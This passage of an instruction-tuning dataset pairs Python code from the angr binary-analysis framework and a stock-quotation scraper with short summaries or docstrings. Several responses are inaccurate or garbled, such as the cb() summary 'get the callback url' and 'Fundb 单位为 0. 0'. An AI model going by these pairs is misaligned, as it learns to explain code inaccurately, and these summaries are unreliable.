                          successors.flat_successors + \\\n                                     successors.unsat_successors\n                    if len(all_successors) > 0:\n                        # set the ip of a copied successor to the successor address\n                        succ = all_successors[0].copy()\n                        succ.ip = succ_addr\n                        analyzed.add(succ_addr)\n                        q.insert(0, succ)\n                    else:\n                        l.warning(\"Could not reach successor: %#x\", succ_addr)\n\n        return constants"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef runtime_values(self):\n        constants = set()\n        for b in self.block_addrs:\n            for sirsb in self._function_manager._cfg.get_all_irsbs(b):\n                for s in sirsb.successors + sirsb.unsat_successors:\n                    for a in s.history.recent_actions:\n                        for ao in a.all_objects:\n                            if not isinstance(ao.ast, claripy.ast.Base):\n                                constants.add(ao.ast)\n                            elif not ao.ast.symbolic:\n                                constants.add(s.solver.eval(ao.ast))\n        return constants", "response": "Returns a set of concrete values used by this function at runtime."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the object this function belongs to.", "response": "def binary(self):\n        \"\"\"\n        Get the object this function belongs to.\n        :return: The object this function belongs to.\n        \"\"\"\n\n        return self._project.loader.find_object_containing(self.addr, membership_check=False)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nadding a custom jumpout site.", "response": "def add_jumpout_site(self, node):\n        \"\"\"\n        Add a custom jumpout site.\n\n        :param node:    The address of the basic block that control flow leaves during this transition.\n        :return:        None\n        \"\"\"\n\n        self._register_nodes(True, node)\n        self._jumpout_sites.add(node)\n        self._add_endpoint(node, 'transition')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd a custom retout site.", "response": "def add_retout_site(self, node):\n        \"\"\"\n        Add a custom retout site.\n\n        Retout (returning to outside of the function) sites are very rare. It mostly occurs during CFG recovery when we\n        incorrectly identify the beginning of a function in the first iteration, and then correctly identify that\n        function later in the same iteration (function alignments can lead to this bizarre case). We will mark all edges\n        going out of the header of that function as a outside edge, because all successors now belong to the\n        incorrectly-identified function. This identification error will be fixed in the second iteration of CFG\n        recovery. However, we still want to keep track of jumpouts/retouts during the first iteration so other logic in\n        CFG recovery still work.\n\n        :param node: The address of the basic block that control flow leaves the current function after a call.\n        :return:     None\n        \"\"\"\n\n        self._register_nodes(True, node)\n        self._retout_sites.add(node)\n        self._add_endpoint(node, 'return')"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndetermining the most suitable name of the function.", "response": "def _get_initial_name(self):\n        \"\"\"\n        Determine the most suitable name of the function.\n\n        :return:    The initial function name.\n        :rtype:     string\n        \"\"\"\n\n        name = None\n        addr = self.addr\n\n        # Try to get a name from existing labels\n        if self._function_manager is not None:\n            if addr in self._function_manager._kb.labels:\n                name = self._function_manager._kb.labels[addr]\n\n        # try to get the name from a hook\n        if name is None and self.project is not None:\n            project = self.project\n            if project.is_hooked(addr):\n                hooker = project.hooked_by(addr)\n                name = hooker.display_name\n            elif project.simos.is_syscall_addr(addr):\n                syscall_inst = project.simos.syscall_from_addr(addr)\n                name = syscall_inst.display_name\n\n        # generate an IDA-style sub_X name\n        if name is None:\n            name = 'sub_%x' % addr\n\n        return name"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_initial_binary_name(self):\n\n        binary_name = None\n\n        # if this function is a simprocedure but not a syscall, use its library name as\n        # its binary name\n        # if it is a syscall, fall back to use self.binary.binary which explicitly says cle##kernel\n        if self.project and self.is_simprocedure and not self.is_syscall:\n            hooker = self.project.hooked_by(self.addr)\n            if hooker is not None:\n                binary_name = hooker.library_name\n\n        if binary_name is None and self.binary is not None:\n            binary_name = os.path.basename(self.binary.binary)\n\n        return binary_name", "response": "Determine the name of the initial binary name for this function."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_initial_returning(self):\n\n        hooker = None\n        if self.is_syscall:\n            hooker = self.project.simos.syscall_from_addr(self.addr)\n        elif self.is_simprocedure:\n            hooker = self.project.hooked_by(self.addr)\n        if hooker and hasattr(hooker, 'NO_RET'):\n            return not hooker.NO_RET\n\n        # Cannot determine\n        return None", "response": "Determine if this function returns or not."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _transit_to(self, from_node, to_node, outside=False, ins_addr=None, stmt_idx=None):\n\n        if outside:\n            self._register_nodes(True, from_node)\n            if to_node is not None:\n                self._register_nodes(False, to_node)\n\n            self._jumpout_sites.add(from_node)\n        else:\n            if to_node is not None:\n                self._register_nodes(True, from_node, to_node)\n            else:\n                self._register_nodes(True, from_node)\n\n        if to_node is not None:\n            self.transition_graph.add_edge(from_node, to_node, type='transition', outside=outside, ins_addr=ins_addr,\n                                           stmt_idx=stmt_idx\n                                           )\n\n        if outside:\n            # this node is an endpoint of the current function\n            self._add_endpoint(from_node, 'transition')\n\n        # clear the cache\n        self._local_transition_graph = None", "response": "Internal method that creates a transition between two basic blocks."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nregister an edge between the caller basic block and callee function. :param from_addr: The basic block that control flow leaves during the transition. :type from_addr: angr.knowledge.CodeNode :param to_func: The function that we are calling :type to_func: Function :param ret_node The basic block that control flow should return to after the function call. :type to_func: angr.knowledge.CodeNode or None :param stmt_idx: Statement ID of this call. :type stmt_idx: int, str or None :param ins_addr: Instruction address of this call. :type ins_addr: int or None", "response": "def _call_to(self, from_node, to_func, ret_node, stmt_idx=None, ins_addr=None, return_to_outside=False):\n        \"\"\"\n        Registers an edge between the caller basic block and callee function.\n\n        :param from_addr:   The basic block that control flow leaves during the transition.\n        :type  from_addr:   angr.knowledge.CodeNode\n        :param to_func:     The function that we are calling\n        :type  to_func:     Function\n        :param ret_node     The basic block that control flow should return to after the\n                            function call.\n        :type  to_func:     angr.knowledge.CodeNode or None\n        :param stmt_idx:    Statement ID of this call.\n        :type  stmt_idx:    int, str or None\n        :param ins_addr:    Instruction address of this call.\n        :type  ins_addr:    int or None\n        \"\"\"\n\n        self._register_nodes(True, from_node)\n\n        if to_func.is_syscall:\n            self.transition_graph.add_edge(from_node, to_func, type='syscall', stmt_idx=stmt_idx, ins_addr=ins_addr)\n        else:\n            self.transition_graph.add_edge(from_node, to_func, type='call', stmt_idx=stmt_idx, ins_addr=ins_addr)\n            if ret_node is not None:\n                self._fakeret_to(from_node, ret_node, to_outside=return_to_outside)\n\n        self._local_transition_graph = None"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _add_return_site(self, return_site):\n        self._register_nodes(True, return_site)\n\n        self._ret_sites.add(return_site)\n        # A return site must be an endpoint of the function - you cannot continue execution of the current function\n        # after returning\n        self._add_endpoint(return_site, 'return')", "response": "Adds a return site to the list of return sites that this function returns."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _add_call_site(self, call_site_addr, call_target_addr, retn_addr):\n        self._call_sites[call_site_addr] = (call_target_addr, retn_addr)", "response": "Adds a call site to the internal list of call sites."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef mark_nonreturning_calls_endpoints(self):\n\n        for src, dst, data in self.transition_graph.edges(data=True):\n            if 'type' in data and data['type'] == 'call':\n                func_addr = dst.addr\n                if func_addr in self._function_manager:\n                    function = self._function_manager[func_addr]\n                    if function.returning is False:\n                        # the target function does not return\n                        the_node = self.get_node(src.addr)\n                        self._callout_sites.add(the_node)\n                        self._add_endpoint(the_node, 'call')", "response": "Iterate through all non - returning functions and mark their endpoints as non - returning calls."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef graph(self):\n\n        if self._local_transition_graph is not None:\n            return self._local_transition_graph\n\n        g = networkx.DiGraph()\n        if self.startpoint is not None:\n            g.add_node(self.startpoint)\n        for block in self._local_blocks.values():\n            g.add_node(block)\n        for src, dst, data in self.transition_graph.edges(data=True):\n            if 'type' in data:\n                if data['type']  == 'transition' and ('outside' not in data or data['outside'] is False):\n                    g.add_edge(src, dst, **data)\n                elif data['type'] == 'fake_return' and 'confirmed' in data and \\\n                        ('outside' not in data or data['outside'] is False):\n                    g.add_edge(src, dst, **data)\n\n        self._local_transition_graph = g\n\n        return g", "response": "Return a networkx. DiGraph that only contains nodes in current function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating a sub - control flow graph of instruction addresses based on self. graph MimeType.", "response": "def subgraph(self, ins_addrs):\n        \"\"\"\n        Generate a sub control flow graph of instruction addresses based on self.graph\n\n        :param iterable ins_addrs: A collection of instruction addresses that should be included in the subgraph.\n        :return: A subgraph.\n        :rtype: networkx.DiGraph\n        \"\"\"\n\n        # find all basic blocks that include those instructions\n        blocks = []\n        block_addr_to_insns = {}\n\n        for b in self._local_blocks.values():\n            # TODO: should I call get_blocks?\n            block = self._get_block(b.addr, size=b.size, byte_string=b.bytestr)\n            common_insns = set(block.instruction_addrs).intersection(ins_addrs)\n            if common_insns:\n                blocks.append(b)\n                block_addr_to_insns[b.addr] = sorted(common_insns)\n\n       #subgraph = networkx.subgraph(self.graph, blocks)\n        subgraph = self.graph.subgraph(blocks).copy()\n        g = networkx.DiGraph()\n\n        for n in subgraph.nodes():\n            insns = block_addr_to_insns[n.addr]\n\n            in_edges = subgraph.in_edges(n)\n            # out_edges = subgraph.out_edges(n)\n            if len(in_edges) > 1:\n                # the first instruction address should be included\n                if n.addr not in insns:\n                    insns = [n.addr] + insns\n\n            for src, _ in in_edges:\n                last_instr = block_addr_to_insns[src.addr][-1]\n                g.add_edge(last_instr, insns[0])\n\n            for i in range(0, len(insns) - 1):\n                g.add_edge(insns[i], insns[i + 1])\n\n        return g"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets the size of the instruction specified by insn_addr.", "response": "def instruction_size(self, insn_addr):\n        \"\"\"\n        Get the size of the instruction specified by `insn_addr`.\n\n        :param int insn_addr: Address of the instruction\n        :return: Size of the instruction in bytes, or None if the instruction is not found.\n        :rtype: int\n        \"\"\"\n\n        for b in self.blocks:\n            block = self._get_block(b.addr, size=b.size, byte_string=b.bytestr)\n            if insn_addr in block.instruction_addrs:\n                index = block.instruction_addrs.index(insn_addr)\n                if index == len(block.instruction_addrs) - 1:\n                    # the very last instruction\n                    size = block.addr + block.size - insn_addr\n                else:\n                    size = block.instruction_addrs[index + 1] - insn_addr\n                return size\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndraw the graph and save it to a PNG file.", "response": "def dbg_draw(self, filename):\n        \"\"\"\n        Draw the graph and save it to a PNG file.\n        \"\"\"\n        import matplotlib.pyplot as pyplot  # pylint: disable=import-error\n        from networkx.drawing.nx_agraph import graphviz_layout  # pylint: disable=import-error\n\n        tmp_graph = networkx.DiGraph()\n        for from_block, to_block in self.transition_graph.edges():\n            node_a = \"%#08x\" % from_block.addr\n            node_b = \"%#08x\" % to_block.addr\n            if node_b in self._ret_sites:\n                node_b += \"[Ret]\"\n            if node_a in self._call_sites:\n                node_a += \"[Call]\"\n            tmp_graph.add_edge(node_a, node_b)\n        pos = graphviz_layout(tmp_graph, prog='fdp')   # pylint: disable=no-member\n        networkx.draw(tmp_graph, pos, node_size=1200)\n        pyplot.savefig(filename)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds an offset to the list of registers that are used as an argument to the function.", "response": "def _add_argument_register(self, reg_offset):\n        \"\"\"\n        Registers a register offset as being used as an argument to the function.\n\n        :param reg_offset:          The offset of the register to register.\n        \"\"\"\n        if reg_offset in self._function_manager._arg_registers and \\\n                    reg_offset not in self._argument_registers:\n            self._argument_registers.append(reg_offset)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef normalize(self):\n\n        # let's put a check here\n        if self.startpoint is None:\n            # this function is empty\n            l.debug('Unexpected error: %s does not have any blocks. normalize() fails.', repr(self))\n            return\n\n        graph = self.transition_graph\n        end_addresses = defaultdict(list)\n\n        for block in self.nodes:\n            if isinstance(block, BlockNode):\n                end_addr = block.addr + block.size\n                end_addresses[end_addr].append(block)\n\n        while any(len(x) > 1 for x in end_addresses.values()):\n            end_addr, all_nodes = \\\n                next((end_addr, x) for (end_addr, x) in end_addresses.items() if len(x) > 1)\n\n            all_nodes = sorted(all_nodes, key=lambda node: node.size)\n            smallest_node = all_nodes[0]\n            other_nodes = all_nodes[1:]\n\n            is_outside_node = False\n            if smallest_node not in graph:\n                is_outside_node = True\n\n            # Break other nodes\n            for n in other_nodes:\n                new_size = get_real_address_if_arm(self._project.arch, smallest_node.addr) - get_real_address_if_arm(self._project.arch, n.addr)\n                if new_size == 0:\n                    # This is the node that has the same size as the smallest one\n                    continue\n\n                new_end_addr = n.addr + new_size\n\n                # Does it already exist?\n                new_node = None\n                if new_end_addr in end_addresses:\n                    nodes = [i for i in end_addresses[new_end_addr] if i.addr == n.addr]\n                    if len(nodes) > 0:\n                        new_node = nodes[0]\n\n                if new_node is None:\n                    # TODO: Do this correctly for hook nodes\n                    # Create a new one\n                    new_node = BlockNode(n.addr, new_size, graph=graph, thumb=n.thumb)\n                    self._block_sizes[n.addr] = new_size\n                    self._addr_to_block_node[n.addr] = new_node\n                    # Put the newnode into end_addresses\n                    end_addresses[new_end_addr].append(new_node)\n\n                # Modify the CFG\n                original_predecessors = list(graph.in_edges([n], data=True))\n                original_successors = list(graph.out_edges([n], data=True))\n\n                for _, d, data in original_successors:\n                    ins_addr = data.get('ins_addr', data.get('pseudo_ins_addr', None))\n                    if ins_addr is not None and ins_addr < d.addr:\n                        continue\n                    if d not in graph[smallest_node]:\n                        if d is n:\n                            graph.add_edge(smallest_node, new_node, **data)\n                        else:\n                            graph.add_edge(smallest_node, d, **data)\n\n                for p, _, _ in original_predecessors:\n                    graph.remove_edge(p, n)\n                graph.remove_node(n)\n\n                # update local_blocks\n                if n.addr in self._local_blocks and self._local_blocks[n.addr].size != new_node.size:\n                    del self._local_blocks[n.addr]\n                    self._local_blocks[n.addr] = new_node\n\n                # update block_cache and block_sizes\n                if (n.addr in self._block_cache and self._block_cache[n.addr].size != new_node.size) or \\\n                        (n.addr in self._block_sizes and self._block_sizes[n.addr] != new_node.size):\n                    # the cache needs updating\n                    self._block_cache.pop(n.addr, None)\n                    self._block_sizes[n.addr] = new_node.size\n\n                for p, _, data in original_predecessors:\n                    if p not in other_nodes:\n                        graph.add_edge(p, new_node, **data)\n\n                # We should find the correct successor\n                new_successors = [i for i in all_nodes\n                                  if i.addr == smallest_node.addr]\n                if new_successors:\n                    new_successor = new_successors[0]\n                    graph.add_edge(new_node, new_successor,\n                                   type=\"transition\",\n                                   outside=is_outside_node,\n                                   # it's named \"pseudo_ins_addr\" because we have no way to know what the actual last\n                                   # instruction is at this moment (without re-lifting the block, which would be a\n                                   # waste of time).\n                                   pseudo_ins_addr=new_node.addr + new_node.size - 1,\n                                   )\n                else:\n                    # We gotta create a new one\n                    l.error('normalize(): Please report it to Fish/maybe john.')\n\n            end_addresses[end_addr] = [smallest_node]\n\n        # Rebuild startpoint\n        if self.startpoint.size != self._block_sizes[self.startpoint.addr]:\n            self.startpoint = self.get_node(self.startpoint.addr)\n\n        # Clear the cache\n        self._local_transition_graph = None\n\n        self.normalized = True", "response": "This function is used to normalize the CFG by removing all basic blocks that are not part of the transition graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef find_declaration(self):\n\n        # determine the library name\n\n        if not self.is_plt:\n            binary_name = self.binary_name\n            if binary_name not in SIM_LIBRARIES:\n                return\n        else:\n            binary_name = None\n            # PLT entries must have the same declaration as their jump targets\n            # Try to determine which library this PLT entry will jump to\n            edges = self.transition_graph.edges()\n            node = next(iter(edges))[1]\n            if len(edges) == 1 and (type(node) is HookNode or type(node) is SyscallNode):\n                target = node.addr\n                if target in self._function_manager:\n                    target_func = self._function_manager[target]\n                    binary_name = target_func.binary_name\n\n        if binary_name is None:\n            return\n\n        library = SIM_LIBRARIES.get(binary_name, None)\n\n        if library is None:\n            return\n\n        if not library.has_prototype(self.name):\n            return\n\n        proto = library.prototypes[self.name]\n\n        self.prototype = proto\n        if self.calling_convention is not None:\n            self.calling_convention.args = None\n            self.calling_convention.func_ty = proto", "response": "Find the most likely function declaration from the embedded collection of prototypes set self. prototype and self. calling_convention with the declaration."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreverses look - up.", "response": "def _rfind(lst, item):\n        \"\"\"\n        Reverse look-up.\n\n        :param list lst: The list to look up in.\n        :param item: The item to look for.\n        :return: Offset of the item if found. A ValueError is raised if the item is not in the list.\n        :rtype: int\n        \"\"\"\n\n        try:\n            return dropwhile(lambda x: lst[x] != item,\n                             next(reversed(range(len(lst)))))\n        except Exception:\n            raise ValueError(\"%s not in the list\" % item)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\npushes the frame cf onto the stack. Return the new stack.", "response": "def push(self, cf):\n        \"\"\"\n        Push the frame cf onto the stack. Return the new stack.\n        \"\"\"\n        cf.next = self\n        if self.state is not None:\n            self.state.register_plugin('callstack', cf)\n            self.state.history.recent_stack_actions.append(CallStackAction(\n                hash(cf), len(cf), 'push', callframe=cf.copy({}, with_tail=False)\n            ))\n\n        return cf"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\npop the top frame from the stack. Return the new stack.", "response": "def pop(self):\n        \"\"\"\n        Pop the top frame from the stack. Return the new stack.\n        \"\"\"\n        if self.next is None:\n            raise SimEmptyCallStackError(\"Cannot pop a frame from an empty call stack.\")\n        new_list = self.next.copy({})\n\n        if self.state is not None:\n            self.state.register_plugin('callstack', new_list)\n            self.state.history.recent_stack_actions.append(CallStackAction(\n                hash(new_list), len(new_list), 'pop', ret_site_addr=self.ret_addr\n            ))\n\n        return new_list"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef call(self, callsite_addr, addr, retn_target=None, stack_pointer=None):\n\n        frame = CallStack(call_site_addr=callsite_addr, func_addr=addr, ret_addr=retn_target,\n                          stack_ptr=stack_pointer)\n        return self.push(frame)", "response": "Push a stack frame into the call stack. This method is called when calling a function in CFG recovery."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef ret(self, retn_target=None):\n\n        if retn_target is None:\n            return self.pop()\n\n        # We may want to return to several levels up there, not only a\n        # single stack frame\n        return_target_index = self._find_return_target(retn_target)\n\n        if return_target_index is not None:\n\n            o = self\n            while return_target_index >= 0:\n                o = o.pop()\n                return_target_index -= 1\n            return o\n\n        l.warning(\"Returning to an unexpected address %#x\", retn_target)\n        return self", "response": "Pop one or many call frames from the stack."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndebug representation of this CalLStack object.", "response": "def dbg_repr(self):\n        \"\"\"\n        Debugging representation of this CallStack object.\n\n        :return: Details of this CalLStack\n        :rtype: str\n        \"\"\"\n\n        stack = [ ]\n        for i, frame in enumerate(self):\n            s = \"%d | %s -> %s, returning to %s\" % (\n                i,\n                \"None\" if frame.call_site_addr is None else \"%#x\" % frame.call_site_addr,\n                \"None\" if frame.func_addr is None else \"%#x\" % frame.func_addr,\n                \"None\" if frame.return_target is None else \"%#x\" % frame.return_target,\n            )\n            stack.append(s)\n\n        return \"\\n\".join(stack)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates the stack suffix.", "response": "def stack_suffix(self, context_sensitivity_level):\n        \"\"\"\n        Generate the stack suffix. A stack suffix can be used as the key to a SimRun in CFG recovery.\n\n        :param int context_sensitivity_level: Level of context sensitivity.\n        :return: A tuple of stack suffix.\n        :rtype: tuple\n        \"\"\"\n\n        ret = ()\n\n        for frame in self:\n            if len(ret) >= context_sensitivity_level*2:\n                break\n            ret = (frame.call_site_addr, frame.func_addr) + ret\n\n        while len(ret) < context_sensitivity_level*2:\n            ret = (None, None) + ret\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _find_return_target(self, target):\n\n        for i, frame in enumerate(self):\n            if frame.ret_addr == target:\n                return i\n        return None", "response": "Searches the stack for the return target and returns the index if exists."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update_stock_codes():\n    all_stock_codes_url = \"http://www.shdjt.com/js/lib/astock.js\"\n    grep_stock_codes = re.compile(r\"~(\\d+)`\")\n    response = requests.get(all_stock_codes_url)\n    all_stock_codes = grep_stock_codes.findall(response.text)\n    with open(stock_code_path(), \"w\") as f:\n        f.write(json.dumps(dict(stock=all_stock_codes)))", "response": "Update all_stock_code with the new stock codes"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_stock_codes(realtime=False):\n    if realtime:\n        all_stock_codes_url = \"http://www.shdjt.com/js/lib/astock.js\"\n        grep_stock_codes = re.compile(r\"~(\\d+)`\")\n        response = requests.get(all_stock_codes_url)\n        stock_codes = grep_stock_codes.findall(response.text)\n        with open(stock_code_path(), \"w\") as f:\n            f.write(json.dumps(dict(stock=stock_codes)))\n        return stock_codes\n\n    with open(stock_code_path()) as f:\n        return json.load(f)[\"stock\"]", "response": "Get all stock codes"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn specific stocks real quotation", "response": "def real(self, stock_codes, prefix=False):\n        \"\"\"return specific stocks real quotation\n        :param stock_codes: stock code or list of stock code,\n                when prefix is True, stock code must start with sh/sz\n        :param prefix: if prefix i True, stock_codes must contain sh/sz market\n            flag. If prefix is False, index quotation can't return\n        :return quotation dict, key is stock_code, value is real quotation.\n            If prefix with True, key start with sh/sz market flag\n\n        \"\"\"\n        if not isinstance(stock_codes, list):\n            stock_codes = [stock_codes]\n\n        stock_list = self.gen_stock_list(stock_codes)\n        return self.get_stock_data(stock_list, prefix=prefix)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns all market quotation snapshot", "response": "def market_snapshot(self, prefix=False):\n        \"\"\"return all market quotation snapshot\n        :param prefix: if prefix is True, return quotation dict's  stock_code\n             key start with sh/sz market flag\n        \"\"\"\n        return self.get_stock_data(self.stock_list, prefix=prefix)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _fetch_stock_data(self, stock_list):\n        pool = multiprocessing.pool.ThreadPool(len(stock_list))\n        try:\n            res = pool.map(self.get_stocks_by_range, stock_list)\n        finally:\n            pool.close()\n        return [d for d in res if d is not None]", "response": "Get stock data from list"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfetch stock data from timekline", "response": "def _fetch_stock_data(self, stock_list):\n        \"\"\"\u56e0\u4e3a timekline \u7684\u8fd4\u56de\u6ca1\u6709\u5e26\u5bf9\u5e94\u7684\u80a1\u7968\u4ee3\u7801\uff0c\u6240\u4ee5\u8981\u624b\u52a8\u5e26\u4e0a\"\"\"\n        res = super()._fetch_stock_data(stock_list)\n\n        with_stock = []\n        for stock, resp in zip(stock_list, res):\n            if resp is not None:\n                with_stock.append((stock, resp))\n        return with_stock"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef formatfundajson(fundajson):\n        result = {}\n        for row in fundajson[\"rows\"]:\n            funda_id = row[\"id\"]\n            cell = row[\"cell\"]\n            result[funda_id] = cell\n        return result", "response": "format fundajson to dict"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef formatfundbjson(fundbjson):\n        result = {}\n        for row in fundbjson[\"rows\"]:\n            cell = row[\"cell\"]\n            fundb_id = cell[\"fundb_id\"]\n            result[fundb_id] = cell\n        return result", "response": "format fundbjson to dict"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef formatetfindexjson(fundbjson):\n        result = {}\n        for row in fundbjson[\"rows\"]:\n            cell = row[\"cell\"]\n            fundb_id = cell[\"fund_id\"]\n            result[fundb_id] = cell\n        return result", "response": "formatetfindexjson - \u6307\u6570ETF \u7684 json \u6570\u636e"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fundb(self, fields=None, min_volume=0, min_discount=0, forever=False):\n        if fields is None:\n            fields = []\n        # \u6dfb\u52a0\u5f53\u524d\u7684ctime\n        self.__fundb_url = self.__fundb_url.format(ctime=int(time.time()))\n        # \u8bf7\u6c42\u6570\u636e\n        rep = requests.get(self.__fundb_url)\n        # \u83b7\u53d6\u8fd4\u56de\u7684json\u5b57\u7b26\u4e32\n        fundbjson = json.loads(rep.text)\n        # \u683c\u5f0f\u5316\u8fd4\u56de\u7684json\u5b57\u7b26\u4e32\n        data = self.formatfundbjson(fundbjson)\n        # \u8fc7\u6ee4\u5c0f\u4e8e\u6307\u5b9a\u4ea4\u6613\u91cf\u7684\u6570\u636e\n        if min_volume:\n            data = {\n                k: data[k]\n                for k in data\n                if float(data[k][\"fundb_volume\"]) > min_volume\n            }\n        if len(fields):\n            data = {\n                k: data[k]\n                for k in data\n                if data[k][\"coupon_descr_s\"] in \"\".join(fields)\n            }\n        if forever:\n            data = {\n                k: data[k]\n                for k in data\n                if data[k][\"fundb_left_year\"].find(\"\u6c38\u7eed\") != -1\n            }\n        if min_discount:\n            data = {\n                k: data[k]\n                for k in data\n                if float(data[k][\"fundb_discount_rt\"][:-1]) > min_discount\n            }\n        self.__fundb = data\n        return self.__fundb", "response": "Fundb \u5355\u4f4d\u4e3a 0. 0"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef etfindex(\n        self, index_id=\"\", min_volume=0, max_discount=None, min_discount=None\n    ):\n        \"\"\"\n        \u4ee5\u5b57\u5178\u5f62\u5f0f\u8fd4\u56de \u6307\u6570ETF \u6570\u636e\n        :param index_id: \u83b7\u53d6\u6307\u5b9a\u7684\u6307\u6570\n        :param min_volume: \u6700\u5c0f\u6210\u4ea4\u91cf\n        :param min_discount: \u6700\u4f4e\u6ea2\u4ef7\u7387, \u9002\u7528\u4e8e\u6ea2\u4ef7\u5957\u5229, \u683c\u5f0f \"-1.2%\", \"-1.2\", -0.012 \u4e09\u79cd\u5747\u53ef\n        :param max_discount: \u6700\u9ad8\u6ea2\u4ef7\u7387, \u9002\u7528\u4e8e\u6298\u4ef7\u5957\u5229, \u683c\u5f0f \"-1.2%\", \"-1.2\", -0.012 \u4e09\u79cd\u5747\u53ef\n        :return: {\"fund_id\":{}}\n        \"\"\"\n        # \u6dfb\u52a0\u5f53\u524d\u7684ctime\n        self.__etf_index_url = self.__etf_index_url.format(\n            ctime=int(time.time())\n        )\n        # \u8bf7\u6c42\u6570\u636e\n        rep = requests.get(self.__etf_index_url)\n        # \u83b7\u53d6\u8fd4\u56de\u7684json\u5b57\u7b26\u4e32, \u8f6c\u5316\u4e3a\u5b57\u5178\n        etf_json = rep.json()\n\n        # \u683c\u5f0f\u5316\u8fd4\u56de\u7684json\u5b57\u7b26\u4e32\n        data = self.formatetfindexjson(etf_json)\n\n        # \u8fc7\u6ee4\n        if index_id:\n            # \u6307\u5b9a\u8ddf\u8e2a\u7684\u6307\u6570\u4ee3\u7801\n            data = {\n                fund_id: cell\n                for fund_id, cell in data.items()\n                if cell[\"index_id\"] == index_id\n            }\n        if min_volume:\n            # \u8fc7\u6ee4\u5c0f\u4e8e\u6307\u5b9a\u4ea4\u6613\u91cf\u7684\u6570\u636e\n            data = {\n                fund_id: cell\n                for fund_id, cell in data.items()\n                if float(cell[\"volume\"]) >= min_volume\n            }\n        if min_discount is not None:\n            # \u6307\u5b9a\u6700\u5c0f\u6ea2\u4ef7\u7387\n            if isinstance(min_discount, str):\n                if min_discount.endswith(\"%\"):\n                    # \u5982\u679c\u662f\u5b57\u7b26\u4e32\u5f62\u5f0f,\u5148\u8f6c\u4e3a\u6d6e\u70b9\u5f62\u5f0f\n                    min_discount = self.percentage2float(min_discount)\n                else:\n                    min_discount = float(min_discount) / 100.\n            data = {\n                fund_id: cell\n                for fund_id, cell in data.items()\n                if self.percentage2float(cell[\"discount_rt\"]) >= min_discount\n            }\n        if max_discount is not None:\n            # \u6307\u5b9a\u6700\u5927\u6ea2\u4ef7\u7387\n            if isinstance(max_discount, str):\n                if max_discount.endswith(\"%\"):\n                    # \u5982\u679c\u662f\u5b57\u7b26\u4e32\u5f62\u5f0f,\u5148\u8f6c\u4e3a\u6d6e\u70b9\u5f62\u5f0f\n                    max_discount = self.percentage2float(max_discount)\n                else:\n                    max_discount = float(max_discount) / 100.\n            data = {\n                fund_id: cell\n                for fund_id, cell in data.items()\n                if self.percentage2float(cell[\"discount_rt\"]) <= max_discount\n            }\n\n        self.__etfindex = data\n        return self.__etfindex", "response": "Get the etfindex index for the current neccesary set of items"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cb(self, min_volume=0):\n        # \u6dfb\u52a0\u5f53\u524d\u7684ctime\n        self.__cb_url = self.__cb_url.format(ctime=int(time.time()))\n        # \u8bf7\u6c42\u6570\u636e\n        rep = requests.get(self.__cb_url)\n        # \u83b7\u53d6\u8fd4\u56de\u7684json\u5b57\u7b26\u4e32\n        fundjson = json.loads(rep.text)\n        # \u683c\u5f0f\u5316\u8fd4\u56de\u7684json\u5b57\u7b26\u4e32\n        data = self.formatjisilujson(fundjson)\n        # \u8fc7\u6ee4\u5c0f\u4e8e\u6307\u5b9a\u4ea4\u6613\u91cf\u7684\u6570\u636e\n        if min_volume:\n            data = {\n                k: data[k]\n                for k in data\n                if float(data[k][\"volume\"]) > min_volume\n            }\n\n        self.__cb = data\n        return self.__cb", "response": "get the callback url"}
